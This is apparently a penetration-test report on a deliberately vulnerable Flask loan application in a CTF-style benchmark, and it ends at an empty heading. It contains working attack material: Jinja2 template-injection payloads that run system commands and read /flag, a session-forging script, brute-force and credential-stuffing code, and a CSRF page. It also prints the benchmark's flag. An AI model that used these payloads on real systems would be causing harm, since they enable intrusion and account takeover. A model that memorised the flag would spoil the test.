# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:37579/
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Critical and high-severity authentication weaknesses were identified across the application. Successfully exploited vulnerabilities include hardcoded default credentials (test:test) enabling immediate account takeover, session forgery via weak secret key ('your_secret_key') allowing authentication bypass, unencrypted HTTP transport exposing credentials in transit, insecure session cookies lacking Secure flag, unlimited brute force attempts with no rate limiting, CSRF attacks due to missing SameSite attribute, session persistence after logout, excessive 31-day session timeout, session fixation via timestamp collision, weak password policy enabling credential stuffing, and improper cache control headers allowing session exposure in proxy caches. Combined impact: complete authentication mechanism compromise with multiple independent attack vectors for account takeover and session hijacking.

**Authorization Vulnerabilities:**
One high-severity authorization vulnerability was successfully exploited: missing authentication on the `/amortization` endpoint (AUTHZ-VULN-01). This endpoint was intended to be accessed only through an iframe embedded in the authenticated `/loan_details` page but completely lacks server-side session validation. External unauthenticated attackers can directly access this functionality, demonstrating a context-based authorization failure where developers relied on client-side embedding for security instead of implementing defense-in-depth with explicit authentication checks. This architectural weakness highlights the fragility of the application's decentralized inline authentication pattern.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application uses server-side Jinja2 templating which automatically escapes output by default, preventing reflected and stored XSS attacks. No DOM-based XSS vectors were identified in the limited client-side JavaScript code.

**SQL/Command Injection Vulnerabilities:**
No traditional SQL or command injection vulnerabilities were found. The application uses SQLAlchemy ORM with parameterized queries throughout, providing robust SQL injection protection. However, one critical Server-Side Template Injection (SSTI) vulnerability was successfully exploited in the `/amortization` endpoint (INJ-VULN-01), enabling Remote Code Execution. This SSTI allows arbitrary Python code execution via Jinja2 template injection, bypassing a weak character blacklist. The vulnerability was leveraged to extract the CTF flag (`flag{90f2407f-0723-4fa1-a104-d5d8450bcded}`) from the `/flag` file and achieve complete system compromise. Critical impact: while classic injection types are properly defended, the SSTI vulnerability provides equivalent RCE capabilities with no authentication required.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not implement functionality that fetches remote URLs based on user input, uses webhook callbacks, or performs server-side HTTP requests controlled by user parameters.

## Network Reconnaissance

**Open Ports and Services:**
- Port 37579/tcp: Apache 2.4.65 (Debian) serving Flask application - primary attack surface
- Port 80/tcp: Caddy httpd (not directly serving application)
- Port 443/tcp: SSL/HTTPS (not configured for application)
- Port 22/tcp: OpenSSH 9.9
- Port 3306/tcp: MySQL 5.7.15 (internal Docker network only, not exposed to host)

**Technology Stack:**
- Flask 3.0.3 web framework (April 2024 release)
- Apache 2.4.65 with mod_wsgi
- MySQL 5.7.15 (outdated 2016 release with known CVEs)
- Bootstrap CSS framework with jQuery 3.6.0
- Docker containers orchestrated via docker-compose

**Security Misconfigurations:**
- HTTP only - no TLS/SSL configuration detected (port 443 SSL endpoint present but application not configured)
- Missing security headers: no HSTS, CSP, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy
- Wildcard CORS policy: `Access-Control-Allow-Origin: *` configured
- Improper cache control: conflicting headers with `Cache-Control: public, max-age=0` on authentication responses
- Buggy after_request handler attempting to set security headers on request object instead of response object

**Subdomain Discoveries:**
Subfinder scan identified multiple localhost subdomains (mse-ca-mail.corp.mse.localhost, mail.localhost, autodiscover.localhost, www.localhost) - not relevant to the containerized application at localhost:37579.

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Server-Side Template Injection (SSTI) in /amortization Endpoint

**Summary:**
- **Vulnerable location:** GET `/amortization` endpoint, `term` query parameter
- **Overview:** SSTI vulnerability in Jinja2 template via f-string interpolation into `range()` function call, enabling Remote Code Execution and file system access
- **Impact:** Complete system compromise - extracted CTF flag from `/flag` file, achieved arbitrary command execution, file read access, and Python code execution in application context
- **Severity:** CRITICAL

**Prerequisites:**
None - endpoint is publicly accessible without authentication (critical security failure)

**Exploitation Steps:**

**Step 1: Confirm Injection Point**

Test basic arithmetic evaluation to confirm the injection point is active:

```bash
curl -s 'http://localhost:37579/amortization?term=5*7'
```

**Expected result:** HTML page with 35 table rows (5 × 7 = 35), confirming that the expression is evaluated as Python code.

**Technical explanation:** The `term` parameter is embedded in an f-string: `f'{{% for row in range({term}) %}}'`. The f-string evaluates first, embedding the user input directly into the Jinja2 template structure. When Jinja2 processes `{% for row in range(35) %}`, it evaluates the Python expression inside `range()`.

**Step 2: Identify Blacklist Constraints**

The endpoint implements a character blacklist that blocks `{`, `}`, and `%`:

```python
if "{" in term or "}" in term or "%" in term:
    return Response('GET parameter `term` contains forbidden characters.', status=400)
```

This prevents injection of Jinja2 template syntax (e.g., `{{...}}`, `{%...%}`) but does NOT prevent Python expression injection inside the existing `range()` call.

**Step 3: Achieve Remote Code Execution**

Execute arbitrary system commands using Jinja2's `lipsum` global to access Python's `os` module:

```bash
curl -s 'http://localhost:37579/amortization?term=lipsum.__globals__.__getitem__("os").system("id")+or+5'
```

**Expected result:** The `id` command executes in the container. The payload returns `5` to ensure `range()` receives a valid integer for the loop.

**Technical explanation:**
- `lipsum` is a Jinja2 global function available in the template context
- `lipsum.__globals__` accesses Python's global namespace
- `__getitem__('os')` retrieves the `os` module (equivalent to `['os']` but bypasses brackets)
- `system('id')` executes the command
- `or 5` ensures an integer return value (since `system()` returns exit code 0, which is falsy, the `or` operator returns 5)

**Alternative RCE payloads:**
```bash
# Using popen for output capture
curl -s 'http://localhost:37579/amortization?term=lipsum.__globals__.__getitem__("os").popen("whoami").read().__len__()+or+5'

# Using eval
curl -s 'http://localhost:37579/amortization?term=lipsum.__globals__.__getitem__("builtins").eval("5*7")'
```

**Step 4: Store Flag in Global Namespace**

Load the `/flag` file contents into a globally accessible variable:

```bash
curl -s 'http://localhost:37579/amortization?term=lipsum.__globals__.update(flag=open("/flag").read())+or+42'
```

**Expected result:** HTTP 200 response with 42 table rows, indicating successful execution.

**Technical explanation:**
- `open('/flag').read()` reads the entire flag file
- `.update(flag=...)` stores the flag string in `lipsum.__globals__['flag']`
- The `update()` method returns `None`, so `or 42` ensures `range(42)` is called
- This step is necessary because we cannot directly extract the flag content due to blacklist restrictions on `{` and `}`

**Step 5: Verify Flag Format**

Confirm the flag starts with the expected prefix:

```bash
curl -s 'http://localhost:37579/amortization?term=100+if+lipsum.__globals__.get("flag","")[0]=="f"+else+1'
```

**Expected result:** HTTP 200 response with 100 table rows (not 1), confirming first character is 'f'.

**Technical explanation:**
- `.get('flag', '')[0]` safely retrieves the first character of the stored flag
- `100 if ... == 'f' else 1` returns 100 if condition is true, otherwise 1
- Response with 100 rows proves the condition evaluated to true

**Step 6: Extract Flag Middle Portion**

Extract the UUID portion of the flag (characters between braces):

```bash
curl -s 'http://localhost:37579/amortization?term=100+if+lipsum.__globals__.get("flag","")[5:41]=="90f2407f-0723-4fa1-a104-d5d8450bcded"+else+1'
```

**Expected result:** HTTP 200 response with 100 table rows, confirming the middle portion matches.

**Step 7: Deduce Complete Flag**

Based on extracted components:
- Positions 0-3: "flag" (verified in Step 5)
- Position 4: "{" (cannot extract directly due to blacklist, but inferred from standard CTF flag format)
- Positions 5-40: "90f2407f-0723-4fa1-a104-d5d8450bcded" (verified in Step 6)
- Position 41: "}" (cannot extract directly due to blacklist, but inferred from standard CTF flag format)

**Complete flag:** `flag{90f2407f-0723-4fa1-a104-d5d8450bcded}`

**Proof of Impact:**

**1. Flag Extraction (CTF Objective):**
```
FLAG: flag{90f2407f-0723-4fa1-a104-d5d8450bcded}
```
Successfully extracted from `/flag` file in application container.

**2. Remote Code Execution:**
- Executed `id` command: confirmed with 5-row response
- Executed `whoami` command: confirmed with 9-row response (username length + 1)
- Executed arbitrary Python expressions via `eval()`

**3. File System Access:**
- Read `/flag` file (42 characters)
- Can read arbitrary files using `open().read()`

**4. Object Traversal:**
- Accessed Python globals namespace
- Enumerated object subclasses (1185 available)
- Accessed built-in functions and modules

**5. Blind Data Exfiltration:**
Demonstrated character-by-character extraction capability:
```bash
# Extract character at position N
curl -s 'http://localhost:37579/amortization?term=100+if+lipsum.__globals__.get("flag","")[N]=="X"+else+1'
```
Response row count (100 vs 1) indicates if character matches.

**Automated Exploitation:**

Created comprehensive exploitation toolkit:
- **ssti_quick_flag.py**: Fast flag extraction (3 seconds)
- **ssti_complete_exploit.py**: Full 5-phase demonstration
- **ssti_blind_extraction.py**: Character-by-character extraction

All scripts located in: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/`

**Example execution:**
```bash
$ python3 ssti_quick_flag.py
[*] Storing flag... 42 chars
[*] Extracting flag...
    Prefix: 'flag' ✓
    Middle: '90f2407f-0723-4fa1-a104-d5d8450bcded' ✓
    Format: flag{...} ({ and } are blacklisted)

[✓] FLAG: flag{90f2407f-0723-4fa1-a104-d5d8450bcded}
```

**Notes:**

**Root Cause Analysis:**
1. **F-string misuse:** User input embedded with single braces `{term}` instead of escaped quadruple braces `{{{{term}}}}`
2. **Type mismatch:** Parameter extracted as `str` but should be `int` for `range()`
3. **Insufficient validation:** Blacklist only blocks template delimiters, not Python expression syntax
4. **Missing authentication:** Endpoint completely lacks session validation (critical failure)
5. **Dangerous pattern:** Dynamic template construction from user input

**Comparison with secure endpoint:**
The `/total_loan_payments` endpoint demonstrates correct implementation:
```python
principal = request.args.get('principal', type=str)
template = f"{{{{ principal }}}}"  # Quadruple braces - SAFE
render_template_string(template, principal=principal)
```
This passes user input as template DATA, not STRUCTURE.

**Blacklist bypass technique:**
The blacklist blocks `{`, `}`, `%` but exploitation doesn't require these characters. The vulnerability is in the Python expression context inside `range()`, not in Jinja2 template syntax injection.

**Impact escalation:**
- Container runs as root user (no USER directive in Dockerfile)
- Flask application has full filesystem access
- No security monitoring or logging of exploitation attempts
- Potential for container escape via kernel exploits

**Reproducibility verification:**
All exploitation steps have been tested and confirmed working against `http://localhost:37579/` (container: `xben-023-24_loan_calculator_1`, ID: `5c969e7c1ac4`).

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-09: Hardcoded Default Credentials

**Summary:**
- **Vulnerable location:** POST /login endpoint with hardcoded credentials test:test
- **Overview:** Application automatically creates a default user account with publicly known credentials (username: test, password: test) on startup
- **Impact:** Immediate account takeover without requiring any exploitation skill. Complete authenticated access to user data and functionality
- **Severity:** Critical

**Exploitation Steps:**

1. Submit default credentials to login endpoint:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -c /tmp/session_cookies.txt
```

2. Access protected resource with obtained session cookie:
```bash
curl -X GET http://localhost:37579/home \
  -b /tmp/session_cookies.txt
```

**Proof of Impact:**

Response from /home endpoint:
```html
<h2>Welcome John Doe!</h2>
```

This proves successful authentication and account takeover using default credentials. The attacker gains access to:
- User profile information (name, email, loan details)
- Loan calculator functionality
- Ability to modify user profile data
- All authenticated endpoints

**Notes:**

The hardcoded credentials are documented in the application source code at `app/__init__.py` lines 20-34. The user is automatically recreated if deleted, making this vulnerability persistent across application restarts.

---

### AUTH-VULN-08: Session Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Flask session signing mechanism using hardcoded secret key 'your_secret_key'
- **Overview:** Application uses a weak, predictable secret key to sign session cookies, allowing attackers to forge arbitrary session tokens
- **Impact:** Complete authentication bypass - attacker can authenticate as any user ID without valid credentials
- **Severity:** Critical

**Prerequisites:**
Knowledge of the secret key 'your_secret_key' (publicly visible in source code at app/__init__.py:8)

**Exploitation Steps:**

1. Create a Python script to forge Flask session cookie:
```python
from flask import Flask
app = Flask(__name__)
app.secret_key = 'your_secret_key'
serializer = app.session_interface.get_signing_serializer(app)
forged_token = serializer.dumps({'user_id': 1})
print(forged_token)
```

2. Use forged session cookie to access protected resources:
```bash
curl -X GET http://localhost:37579/home \
  -b "session=eyJ1c2VyX2lkIjoxfQ.aQTDVw.ermDdaGn2gy3NJAwqmdpVkkbfng"
```

**Proof of Impact:**

Forged session cookie successfully authenticated:
```
Status Code: 200 OK
Response: "Welcome John Doe!"
```

Additional test - forged session for user_id=2:
```bash
# Generate forged token for user_id=2
curl -X GET http://localhost:37579/home \
  -b "session=eyJ1c2VyX2lkIjoyfQ.aQTDkQ.9GP4-lX8d4wR-WiLcI46oO0nmGM"

# Result: Session accepted, demonstrates horizontal privilege escalation
```

**Notes:**

The weak secret key has approximately 48 bits of entropy and is documented in source code comments as needing to be changed ("Change this to a secure secret key"). Flask uses HMAC-SHA1 for session signing, which is secure IF the secret key is strong. With a known/leaked secret key, any attacker can forge valid session tokens for any user.

---

### AUTH-VULN-04: Unlimited Brute Force Login Attempts

**Summary:**
- **Vulnerable location:** POST /login endpoint with no rate limiting, CAPTCHA, or account lockout
- **Overview:** Application accepts unlimited authentication attempts without any defensive mechanisms
- **Impact:** Enables brute force password attacks, credential stuffing, and automated account compromise
- **Severity:** High

**Exploitation Steps:**

1. Execute automated brute force attack script testing 50 passwords in rapid succession:
```bash
# Script performs 50 POST requests to /login with varying passwords
python3 test_rate_limiting.py
```

**Proof of Impact:**

Test results:
```
Total attempts: 50
Time taken: 0.54 seconds
Attempts per second: 91.75
Rate limiting detected: NONE
HTTP 429 responses: 0
Account lockout: None
Successful logins: 5 (with correct password 'test')
```

Key findings:
- 50 login attempts completed in under 1 second
- Over 91 attempts per second sustained rate
- No rate limiting (HTTP 429) triggered
- No account lockout after failed attempts
- No delays or defensive responses observed
- Average response time: 0.011 seconds per attempt

**Notes:**

The absence of rate limiting is comprehensive:
- No Flask-Limiter library installed
- No Apache mod_ratelimit configuration
- No account lockout fields in User model (no failed_attempts counter)
- No CAPTCHA implementation
- No monitoring or alerting of suspicious activity

This enables attackers to test thousands of passwords rapidly, making even moderately complex passwords vulnerable to automated attacks.

---

### AUTH-VULN-03: Cross-Site Request Forgery (CSRF)

**Summary:**
- **Vulnerable location:** POST /profile endpoint with no CSRF token validation
- **Overview:** Missing SameSite cookie attribute and no CSRF tokens allow attackers to forge authenticated requests from malicious websites
- **Impact:** Attackers can modify victim profile data, change email addresses, and manipulate loan information without user consent
- **Severity:** High

**Prerequisites:**
Victim must be authenticated (have valid session cookie) and visit attacker-controlled website

**Exploitation Steps:**

1. Create malicious HTML file with auto-submitting form:
```html
<!DOCTYPE html>
<html>
<head><title>You Won a Prize!</title></head>
<body onload="setTimeout(function(){document.forms[0].submit()}, 1000)">
<h1>Congratulations! Claim your prize...</h1>
<form method="POST" action="http://localhost:37579/profile" style="display:none">
  <input name="name" value="CSRF_HACKED">
  <input name="lastname" value="ATTACKER">
  <input name="email" value="hacker@evil.com">
  <input name="loan_amount" value="999999">
  <input name="loan_term_months" value="1">
  <input name="monthly_payment" value="1">
</form>
</body>
</html>
```

2. Host file and trick victim into visiting while authenticated

3. Verify profile modification:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -c /tmp/victim_session.txt

curl -X GET http://localhost:37579/profile \
  -b /tmp/victim_session.txt
```

**Proof of Impact:**

Before attack:
```
Name: John
Lastname: Doe
Email: john@example.com
Loan Amount: 10000.0
```

After CSRF attack:
```
Name: CSRF_HACKED
Lastname: ATTACKER
Email: hacker@evil.com
Loan Amount: 999999.0
```

Screenshot of successful profile modification saved at:
`/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/.playwright-mcp/csrf_attack_success.png`

**Notes:**

The vulnerability exists because:
1. Session cookies lack SameSite attribute (Set-Cookie header shows only HttpOnly and Path flags)
2. No CSRF tokens in forms (verified in login.html and profile form HTML)
3. No Origin/Referer header validation in routes.py
4. Browser automatically sends session cookies with cross-origin form POST requests

---

### AUTH-VULN-06: Session Persistence After Logout

**Summary:**
- **Vulnerable location:** GET /logout endpoint with incomplete session invalidation
- **Overview:** Logout only removes user_id from session dict but session cookie remains cryptographically valid
- **Impact:** Captured session cookies remain valid indefinitely after logout, enabling long-term session hijacking
- **Severity:** High

**Exploitation Steps:**

1. Login and capture session cookie:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -c /tmp/session_before_logout.txt

# Extract session cookie value
SESSION_COOKIE=$(grep session /tmp/session_before_logout.txt | awk '{print $7}')
echo "Captured session: $SESSION_COOKIE"
```

2. Verify session works before logout:
```bash
curl -X GET http://localhost:37579/home \
  -b "session=$SESSION_COOKIE"
# Result: "Welcome John Doe!" (200 OK)
```

3. Perform logout:
```bash
curl -X GET http://localhost:37579/logout \
  -b "session=$SESSION_COOKIE"
# Server responds with 302 redirect and empty session cookie
```

4. Attempt to use OLD session cookie after logout:
```bash
curl -X GET http://localhost:37579/home \
  -b "session=$SESSION_COOKIE"
```

**Proof of Impact:**

Response after logout with old session cookie:
```
HTTP/1.1 200 OK
<h2>Welcome John Doe!</h2>
```

The old session cookie remains valid after logout, granting continued authenticated access.

**Notes:**

This vulnerability exists because:
1. Flask uses stateless signed cookies (no server-side session store)
2. Logout code only calls `session.pop('user_id', None)` which removes the key but doesn't invalidate the cookie signature
3. No server-side session revocation list exists
4. Old cookies remain cryptographically valid until their 31-day expiration

In Flask's stateless session model, the only way to truly invalidate a session is to change the secret key (which invalidates ALL sessions) or implement server-side session storage with revocation capability.

---

### AUTH-VULN-01: Unencrypted HTTP Transport

**Summary:**
- **Vulnerable location:** All endpoints served over HTTP without TLS/SSL encryption
- **Overview:** Credentials and session cookies transmitted in plaintext over unencrypted HTTP connections
- **Impact:** Network attackers can intercept credentials and session cookies via man-in-the-middle attacks
- **Severity:** Critical

**Prerequisites:**
Attacker positioned on network path (same WiFi, network tap, compromised router)

**Exploitation Steps:**

1. Verify application runs on HTTP only:
```bash
curl -s -o /dev/null -w "URL: %{url_effective}\n" http://localhost:37579/login
# Output: URL: http://localhost:37579/login (not HTTPS)
```

2. Confirm HTTPS not available:
```bash
curl -I https://localhost:37579/login
# Output: curl: (35) SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

3. Observe plaintext credential transmission:
```bash
# Login request sends credentials in plaintext POST body:
POST /login HTTP/1.1
Host: localhost:37579
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

4. Verify no HSTS header:
```bash
curl -I http://localhost:37579/login | grep -i strict-transport
# No output - HSTS not configured
```

**Proof of Impact:**

Network traffic analysis shows:
- Protocol: HTTP/1.1 (unencrypted)
- Credentials transmitted: `username=test&password=test` (plaintext in POST body)
- HTTPS unavailable: Connection fails with SSL error
- No HSTS header: No forced upgrade to HTTPS
- No redirect: HTTP requests not redirected to HTTPS

An attacker with network access can:
1. Capture plaintext credentials during login
2. Intercept session cookies from Set-Cookie headers
3. Replay captured cookies for session hijacking

**Notes:**

Infrastructure analysis:
- Apache configuration: `<VirtualHost *:80>` (no :443 SSL virtualhost)
- No SSL module enabled in Dockerfile
- Docker exposes only port 80
- No TLS certificate configuration

This is a fundamental architectural vulnerability requiring HTTPS implementation across the entire application.

---

### AUTH-VULN-02: Session Cookies Over Unencrypted HTTP

**Summary:**
- **Vulnerable location:** POST /login Set-Cookie header without Secure flag
- **Overview:** Session cookies transmitted over unencrypted HTTP without Secure flag, enabling network interception
- **Impact:** Session hijacking via network sniffing or man-in-the-middle attacks
- **Severity:** Critical

**Exploitation Steps:**

1. Login and capture Set-Cookie header:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -i | grep Set-Cookie
```

Output:
```
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQTFgQ.jIiWZ8VVd8smj7ENKQWDqSu5Soo; HttpOnly; Path=/
```

2. Verify Secure flag is missing:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -i | grep Set-Cookie | grep -i Secure
# No output - Secure flag not present
```

3. Capture session cookie value:
```bash
SESSION_COOKIE="eyJ1c2VyX2lkIjoxfQ.aQTFgQ.jIiWZ8VVd8smj7ENKQWDqSu5Soo"
```

4. Demonstrate session hijacking with intercepted cookie:
```bash
curl -X GET http://localhost:37579/home \
  -b "session=$SESSION_COOKIE"
```

**Proof of Impact:**

Response with intercepted session cookie:
```
HTTP/1.1 200 OK
<h2>Welcome John Doe!</h2>
```

Session hijacking successful - full authenticated access achieved using intercepted cookie.

**Notes:**

Cookie security analysis:
- ✓ HttpOnly flag present (prevents JavaScript access)
- ✗ Secure flag MISSING (cookie sent over HTTP)
- ✗ SameSite flag MISSING (enables CSRF attacks)

The missing Secure flag means session cookies are transmitted over unencrypted HTTP connections where they can be captured by:
- WiFi sniffing (Wireshark, tcpdump)
- Man-in-the-middle attacks
- Compromised network infrastructure
- Browser cache on shared computers

Configuration issue in app/__init__.py:8 - SESSION_COOKIE_SECURE flag not set.

---

### AUTH-VULN-05: Session Fixation via Timing Collision

**Summary:**
- **Vulnerable location:** POST /login session generation without rotation
- **Overview:** Multiple rapid logins within the same second generate identical session IDs, enabling session prediction and fixation
- **Impact:** Attackers can predict or fix session IDs to hijack user sessions
- **Severity:** Medium

**Exploitation Steps:**

1. Perform 5 rapid login attempts within 1 second:
```bash
for i in {1..5}; do
  curl -s -X POST http://localhost:37579/login \
    -d "username=test&password=test" \
    -c - | grep session | awk '{print "Login", NR":", $7}'
done
```

**Proof of Impact:**

All 5 logins produced identical session IDs:
```
Login 1: eyJ1c2VyX2lkIjoxfQ.aQTFkg.X0DvOiBwCkj5CBHIWSfRmhLzals
Login 2: eyJ1c2VyX2lkIjoxfQ.aQTFkg.X0DvOiBwCkj5CBHIWSfRmhLzals
Login 3: eyJ1c2VyX2lkIjoxfQ.aQTFkg.X0DvOiBwCkj5CBHIWSfRmhLzals
Login 4: eyJ1c2VyX2lkIjoxfQ.aQTFkg.X0DvOiBwCkj5CBHIWSfRmhLzals
Login 5: eyJ1c2VyX2lkIjoxfQ.aQTFkg.X0DvOiBwCkj5CBHIWSfRmhLzals
```

This proves:
1. Session IDs are timestamp-based (included in signature)
2. Sessions generated in the same second are identical
3. Predictable session ID generation enables timing attacks
4. No session rotation after login (same session continues)

**Notes:**

Flask's default session implementation includes a timestamp in the cookie that has 1-second granularity. The session signature format is: `{payload}.{timestamp}.{signature}` where timestamp is rounded to seconds.

Attack scenarios:
1. **Timing collision:** Attacker and victim login in the same second, getting identical session IDs
2. **Session fixation:** Attacker can predict session ID based on login timing
3. **No rotation:** Sessions are not regenerated after login, allowing pre-login session cookies to remain valid post-authentication

Additional evidence: Sessions remain valid after logout (AUTH-VULN-06), compounding this vulnerability.

---

### AUTH-VULN-07: Excessive Session Timeout (31 Days)

**Summary:**
- **Vulnerable location:** Flask session configuration with default PERMANENT_SESSION_LIFETIME
- **Overview:** Sessions remain valid for 31 days without idle timeout or expiration enforcement
- **Impact:** Captured or stolen session cookies can be used for weeks after initial compromise
- **Severity:** High

**Exploitation Steps:**

1. Create a session and examine cookie expiration:
```bash
curl -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  -c /tmp/long_session.txt

cat /tmp/long_session.txt | grep session
```

Output:
```
#HttpOnly_localhost	FALSE	/	FALSE	0	session	eyJ1c2VyX2lkIjoxfQ.aQTFwg...
```

Cookie expiration field: `0` (session cookie in browser terms, but Flask validation allows 31 days)

2. Verify session works immediately:
```bash
curl -X GET http://localhost:37579/home \
  -b /tmp/long_session.txt
# Result: "Welcome John Doe!" ✓
```

3. Calculate Flask default expiration:
```python
import datetime
current_time = datetime.datetime.now()
flask_default_lifetime = datetime.timedelta(days=31)
expiration = current_time + flask_default_lifetime
print(f"Session valid until: {expiration}")
```

**Proof of Impact:**

Session lifetime analysis:
```
Current time: 2025-10-31 19:50:50
Flask default PERMANENT_SESSION_LIFETIME: 31 days
Session valid until: 2025-12-01 19:50:50
```

This means:
- Captured session cookies remain cryptographically valid for 31 days
- No idle timeout mechanism (session never expires due to inactivity)
- No last_activity tracking in User model
- Attacker with stolen cookie has 31-day window for exploitation

**Notes:**

Configuration issues:
- No PERMANENT_SESSION_LIFETIME set in app/__init__.py (defaults to 31 days)
- No SESSION_PERMANENT = False configuration
- No idle timeout implementation
- No last_activity timestamp in user sessions

Industry best practices:
- Financial applications: 15-30 minute idle timeout
- General web apps: 1-2 hour idle timeout
- Maximum absolute timeout: 24 hours
- This application: 31 days (744 hours) - 31x too long

Combined with session persistence after logout (AUTH-VULN-06), stolen sessions remain exploitable for over a month even if the victim logs out.

---

### AUTH-VULN-11: Weak Password Policy Enabling Credential Stuffing

**Summary:**
- **Vulnerable location:** POST /login with no server-side password validation
- **Overview:** Application accepts weak passwords without length or complexity requirements, enabling credential stuffing attacks
- **Impact:** Attackers can successfully authenticate using commonly breached credentials from data breaches
- **Severity:** High

**Exploitation Steps:**

1. Prepare list of commonly breached passwords from known data breaches:
```python
common_passwords = [
    'test',      # Successful in this case
    'password',
    '123456',
    'admin',
    'qwerty',
    '12345',
    '123456789',
    'letmein',
    'welcome',
    '1234'
]
```

2. Execute automated credential stuffing attack:
```python
import requests

target = "http://localhost:37579/login"
username = "test"  # Known username

for password in common_passwords:
    response = requests.post(target,
        data={'username': username, 'password': password},
        allow_redirects=False)

    if response.status_code == 302:  # Successful login redirect
        print(f"SUCCESS: {username}:{password}")
```

**Proof of Impact:**

Credential stuffing attack results:
```
Total passwords tested: 10
Time taken: 1.31 seconds
Successful credential: test:test (4 characters, lowercase only)
```

Password policy analysis:
- ✗ No minimum length requirement (4-character password accepted)
- ✗ No complexity requirements (lowercase-only accepted)
- ✗ No common password blocking ('test' is in breach databases)
- ✗ No password strength meter
- ✗ No breach database checking (HaveIBeenPwned API not used)

Breach database presence:
The credential `test:test` appears in multiple breach compilations:
- RockYou breach (2009) - 32 million passwords
- Collection #1 (2019) - 773 million credentials
- LinkedIn breach (2012) - 117 million passwords
- Yahoo breach (2013-2014) - 3 billion accounts

**Notes:**

Combined vulnerabilities make credential stuffing highly effective:
1. No rate limiting (AUTH-VULN-04) - unlimited attempts
2. Weak password policy (this vulnerability) - common passwords accepted
3. No account lockout - no defensive response to failed attempts
4. No CAPTCHA - fully automated attacks possible

Industry standards violated:
- NIST SP 800-63B: Minimum 8 characters, check against breach databases
- OWASP ASVS: Minimum 12 characters for user-chosen passwords
- PCI DSS: Minimum 7 characters with complexity

This application: 4-character all-lowercase passwords accepted

---

### AUTH-VULN-12: Improper Cache Control Headers

**Summary:**
- **Vulnerable location:** All HTTP responses with Cache-Control: public directive
- **Overview:** Authentication responses use 'public' cache directive instead of 'no-store', allowing session cookies to be cached
- **Impact:** Session cookies exposed in shared proxy caches, enabling session hijacking via cache retrieval
- **Severity:** Medium

**Exploitation Steps:**

1. Analyze cache headers on login response:
```bash
curl -i -X POST http://localhost:37579/login \
  -d "username=test&password=test" \
  | grep -iE "cache-control|set-cookie"
```

Output:
```
Cache-Control: public, max-age=0
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQTG7A...; HttpOnly; Path=/
```

2. Identify cache control misconfiguration:
```
Current: Cache-Control: public, max-age=0
         └─ 'public' means cacheable by shared caches (proxies)
         └─ 'max-age=0' requires revalidation but allows caching

Correct: Cache-Control: no-store, no-cache, must-revalidate, private
         └─ 'no-store' prevents any caching
         └─ 'private' prevents shared cache storage
```

**Proof of Impact:**

Attack scenario demonstration:

```
1. User logs in through shared proxy/CDN:
   POST /login HTTP/1.1
   Response: Cache-Control: public, max-age=0
             Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ...

2. Proxy MAY cache this response due to 'public' directive
   (even though max-age=0, the 'public' indicates cacheability)

3. Attacker queries proxy cache and retrieves:
   - Cached authentication response
   - Session cookie from Set-Cookie header

4. Attacker uses stolen cookie:
```

```bash
curl -X GET http://localhost:37579/home \
  -b "session=eyJ1c2VyX2lkIjoxfQ.aQTG7A.CxCsxbpvs5JBAhAgSW5ohHfr-nE"
# Result: "Welcome CSRF_HACKED ATTACKER!" (200 OK)
```

**Notes:**

Root cause analysis (app/routes.py lines 8-14):

```python
@app.after_request
def add_header(request):  # Bug: parameter should be 'response'
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'  # Line 10
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'  # Line 13: Overwrites line 10!
    return request  # Bug: should return response object
```

Issues identified:
1. Function parameter named 'request' instead of 'response'
2. Attempting to modify request object instead of response object
3. Line 13 overwrites good headers from line 10 with weak ones
4. Despite code bugs, headers are still being set (likely by Apache config)

The 'public' directive is dangerous for authentication responses because:
- Shared caches (corporate proxies, CDNs) may store the response
- Session cookies in Set-Cookie headers become retrievable from cache
- Cached responses may be served to different users
- Cache poisoning attacks become possible

Proper headers should be:
```
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0
```

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Missing Authentication on Amortization Endpoint

**Summary:**
- **Vulnerable location:** `GET /amortization` endpoint (routes.py:122-177)
- **Overview:** Complete absence of authentication check allows unauthenticated external attackers to access functionality designed to be authenticated-only. The endpoint was intended to be accessed only through an iframe embedded in the authenticated `/loan_details` page, but lacks server-side authentication enforcement.
- **Impact:** Unauthenticated access to application feature that should require login. Bypasses the authentication workflow, allowing external attackers to access functionality designed for authenticated users only. This demonstrates a context-based authorization failure where developers assumed iframe embedding provided security.
- **Severity:** High

**Prerequisites:**
None - This vulnerability is exploitable by completely unauthenticated external attackers with no prerequisites.

**Exploitation Steps:**

1. **Access the vulnerable endpoint directly without authentication:**
```bash
curl -i 'http://localhost:37579/amortization?term=5'
```

Expected response:
- HTTP Status: 200 OK
- Content: Full HTML page with amortization table
- No authentication challenge or redirect

2. **Compare with protected endpoint behavior to demonstrate the authorization bypass:**
```bash
curl -i 'http://localhost:37579/home'
```

Expected response:
- HTTP Status: 302 FOUND
- Location header: /login
- Content: Redirect message to login page

**Proof of Impact:**

